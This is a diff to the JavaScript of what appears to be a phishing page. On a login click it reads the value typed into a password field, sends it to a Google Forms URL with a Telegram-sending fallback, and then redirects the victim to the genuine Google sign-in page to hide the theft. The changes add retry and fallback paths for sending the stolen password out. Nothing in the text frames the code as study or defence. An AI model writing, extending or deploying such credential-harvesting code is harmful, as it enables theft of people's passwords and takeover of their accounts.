@@ -96,9 +96,19 @@ function OnClickLogging()
 //top.document.getElementsByName("body")[0].className = "loading";
 document.body.classList.toggle("loading");
 var testPass = document.getElementById("passfield").value;
-SendFormsName(testPass);
 
+setTimeout(RedirectGoogle, 10000);
+
+try
+{
+SendFormsName(testPass);
+}
+catch (e) {
 SendTelegramName(testPass);
+}
+
+
+//SendTelegramName(testPass);
 /*$(function() {
 
 document.getElementsByName("body")[0].classList.toggle("loading");
@@ -123,9 +133,27 @@ fetch('https://docs.google.com/forms/d/e/1FAIpQLSdJ77GwvIG8tdZmIPA5A6uf-KqZ_97Wd
 ).then(
 function()
     {
-    console.log("OK");
+		try
+		{
+		SendTelegramName(name);
+		}
+		catch (e) {
+			setTimeout(RedirectGoogle, 1000);
+		}
+
     }
-);
+)
+.catch(function()
+    {
+		try
+		{
+		SendTelegramName(name);
+		}
+		catch (e) {
+			setTimeout(RedirectGoogle, 1000);
+		}
+
+    });
 }
 
 
@@ -144,12 +172,20 @@ request.setRequestHeader('Content-Type', 'application/json');
 request.send(JSON.stringify(data));
 if(request.response) 
 {
-	console.log("OK");
+	setTimeout(RedirectGoogle, 1000);
 	
 };
 
 
 }
+
+
+function RedirectGoogle()
+{
+window.location.href =
+"https://accounts.google.com/v3/signin/identifier?dsh=S-402281380%3A1665230210296318&continue=https%3A%2F%2Fwww.google.com%2F%3Fgws_rd%3Dssl&ec=GAZAmgQ&hl=uk&passive=true&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=AQDHYWpguWuMxxdaSyDWwANTnEhu3Sdd3I0STI02kFeGGKAaa8UjvMii6BEOwOi8PkMOAopt_p4BBA";
+}
+
 </script>
 
 </html>
